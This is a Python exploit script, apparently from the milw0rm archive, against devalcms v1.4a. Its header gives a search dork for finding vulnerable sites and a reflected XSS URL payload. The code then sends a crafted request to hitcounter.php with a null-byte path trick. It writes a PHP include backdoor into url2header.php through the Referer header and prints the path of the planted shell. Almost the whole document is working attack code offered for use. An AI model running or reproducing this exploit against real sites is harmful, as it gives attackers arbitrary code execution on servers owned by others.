#!/usr/bin/python
#####################################################################################
####           devalcms v1.4a Remote Code Execution Exploit / Xss                ####
#####################################################################################
#                                                                                   #
#AUTHOR : IRCRASH (R3d.W0rm (Sina Yazdanmehr))                                      #
#Discovered by : IRCRASH (R3d.W0rm (Sina Yazdanmehr))                               #
#Our Site : Http://IRCRASH.COM                                                      #
#IRCRASH Team Members : Dr.Crash - R3d.w0rm (Sina Yazdanmehr)                       #
#####################################################################################
#                                                                                   #
#Download : http://www.sourceforge.net/projects/devalcms                            #
#                                                                                   #
#DORK : "powered by devalcms v1.4.a"                                                #
#                                                                                   #
#####################################################################################
#                                      [Xss]                                        #
#                                                                                   #
#http://Site/[path]/index.php?currentpath=<script>alert('Xss')</script>             #
#                                                                                   #
#####################################################################################
#                                                                                   #
#                           [Remote Code Execution]                                 #
#                                                                                   #
#Use this exploit for remote code execution valun .                                 #
#                                                                                   #
#####################################################################################
#                           Site : Http://IRCRASH.COM                               #
###################################### TNX GOD ######################################
import sys,socket
argv=sys.argv
data='<?php include $_GET[\'evil\']; ?>'
query='/modules/tool/hitcounter.php?gv_folder_data=./url2header.php%00'
if len(argv) < 3 :
    print '[*]Devalcms v1.4.a Remote code execut exploit'
    print '[*]Dork : powered by devalcms v1.4.a'
    print '[*]Powered by : R3d.W0rm'
    print '[*]Our Site : http://ircrash.com'
    print '[*]Usage : ' + argv[0] + ' site /path'
    exit()
if 'http://' in argv[1] :
    target=argv[1].replace('http://','')
else :
    target=argv[1]
if '/' in argv[2] :
    path=argv[2]
else :
    path='/' + argv[2]
print '[*]Devalcms v1.4.a Remote code execut exploit'
print '[*]Powered by : R3d.W0rm'
print '[*]Our Site : http://ircrash.com'
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target,80))
sock.send("GET " + path + query + " HTTP/1.1\n")
sock.send("Host: " + target + "\n")
sock.send("Referer: " + data + "\n\n\n")
recv=sock.recv(2048)
if 'HTTP/1.1 200 OK' in recv :
    print '[+]Code injected .'
    print '[+]Code inject in http://: ' + target + path + '/modules/tool/url2header.php'
else :
    print '[-]Can not inject code.'
exit()

# milw0rm.com [2008-09-05]